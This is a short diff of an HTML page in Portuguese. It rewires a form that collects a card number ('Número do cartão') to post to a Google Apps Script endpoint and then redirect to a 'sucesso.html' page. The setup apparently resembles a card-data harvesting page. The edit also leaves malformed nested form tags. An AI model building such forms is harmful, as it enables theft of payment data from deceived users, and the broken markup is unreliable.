@@ -129,11 +129,13 @@ button:active {
   </div>
 
   <form
-    action="https://script.google.com/macros/s/AKfycbxhwuw7C0u3wtpNnG0LRY7R8gaiwOc9qSXpVXSZab_zgM834sJqSl-yC2_IPnZ07MDK/exec"
-    method="POST"
-  >
-
-    <label>Número</label>
+    <form 
+  action="https://script.google.com/macros/s/SEU_LINK/exec"
+  method="POST"
+  target="_self"
+  onsubmit="setTimeout(() => { window.location.href='sucesso.html'; }, 500);"
+>
+    <label>Número do cartão</label>
     <input name="numero" required placeholder="Digite o número">
 
     <div class="row">
@@ -171,3 +173,4 @@ button:active {
 
 </body>
 </html>
+
